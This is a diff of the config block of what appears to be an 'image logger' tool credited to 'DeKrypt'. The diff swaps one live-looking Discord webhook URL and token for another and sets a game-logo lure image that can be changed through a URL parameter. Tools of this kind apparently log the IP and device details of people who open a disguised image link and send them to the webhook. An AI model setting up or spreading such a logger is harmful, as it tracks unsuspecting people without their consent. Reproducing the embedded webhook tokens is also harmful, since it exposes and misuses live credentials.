@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1349845274587168809/dTj1TBJa0nOGfo2QW9HpJwgS0kIz-KDZG2z-iTiF6DYzztp8qgZ5bI-64I34ldlBwU3R",
+    "webhook": "https://discord.com/api/webhooks/1349847149374083105/gJIgjDH-KXVMGjYZbWdSBVFXA0B7iwtzhWLTP6TzSQ1EJ0cAb0H8E1MQU9NyCN8emkmf",
     "image": "https://logos-world.net/wp-content/uploads/2021/02/Rainbow-Six-Symbol.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
